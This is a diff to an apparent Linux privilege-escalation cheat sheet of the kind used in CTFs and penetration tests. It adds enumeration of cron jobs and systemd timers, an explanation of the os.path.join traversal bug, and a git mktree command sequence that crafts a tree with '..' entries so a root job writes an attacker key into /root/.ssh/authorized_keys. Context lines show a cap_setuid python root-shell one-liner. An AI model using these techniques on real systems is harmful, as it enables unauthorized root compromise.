@@ -51,14 +51,61 @@ GTFOBins again for the standard binaries. `cap_setuid+ep` on python/perl:
 ./python -c 'import os;os.setuid(0);os.system("/bin/bash")'
 ```
 
-## Cron and writable scripts
+## Cron, timers and custom scripts
 
 ```bash
-./pspy64        # watch for jobs that /etc/crontab does not list
+./pspy64                                    # jobs /etc/crontab does not list
+systemctl list-timers --all --no-pager      # systemd timers are not in crontab
+ls -la /etc/cron.d /etc/cron.*/ /etc/systemd/system/*.service
 ```
 A root cron running a script you can write, or running a relative path with a
 writable PATH component, is a direct win. Also check for `tar`/`rsync`
 wildcards in cron commands.
+
+**Read any custom script you can, even when you cannot write it.** A
+world-readable script run by root is worth more than a config file you cannot
+read, because it tells you what root does with data you might control. Work
+through it asking: where does its input come from, and can I influence that
+input? Check the unit for `User=` and the log file's owner to confirm what it
+runs as:
+
+```bash
+cat /etc/systemd/system/<name>.service | grep -E 'User=|ExecStart='
+ls -la /var/log/<name>.log
+```
+
+The recurring bug class is a root job joining an attacker-influenced name onto a
+directory:
+
+```python
+target = os.path.join(base_dir, name_from_untrusted_source)   # no containment check
+```
+
+`os.path.join` does not normalise `..`, and it *discards* `base_dir` entirely if
+the second argument is absolute. Anything that feeds it filenames from a
+database, an API response, an archive, or a git tree is a candidate for
+arbitrary file write as root. Useful targets, in order of cleanliness:
+`/root/.ssh/authorized_keys` (additive, reversible), a file in `/etc/cron.d`
+(needs mode 0644), a script in `/etc/cron.hourly` (needs the execute bit).
+
+Note that `git` is a common untrusted source here — and that git's own
+restrictions are a porcelain behaviour, not a format one. `git add` refuses a
+path containing `..`, but tree objects are just name-to-hash maps and
+`git mktree` writes them directly:
+
+```bash
+BLOB=$(cat payload | git hash-object -w --stdin)
+T=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)
+T=$(printf '040000 tree %s\t.ssh\n' "$T" | git mktree)
+T=$(printf '040000 tree %s\troot\n' "$T" | git mktree)
+for i in $(seq 1 5); do T=$(printf '040000 tree %s\t..\n' "$T" | git mktree); done
+C=$(echo x | git commit-tree "$T"); git update-ref refs/heads/main "$C"
+git ls-tree -r HEAD     # verify the path the consumer will see
+```
+
+Count the `..` levels against the consumer's base directory, and confirm with
+`git ls-tree -r` before pushing. Forges do not fsck incoming objects by default,
+so such a tree usually survives a push.
 
 ## Services and internal ports
 
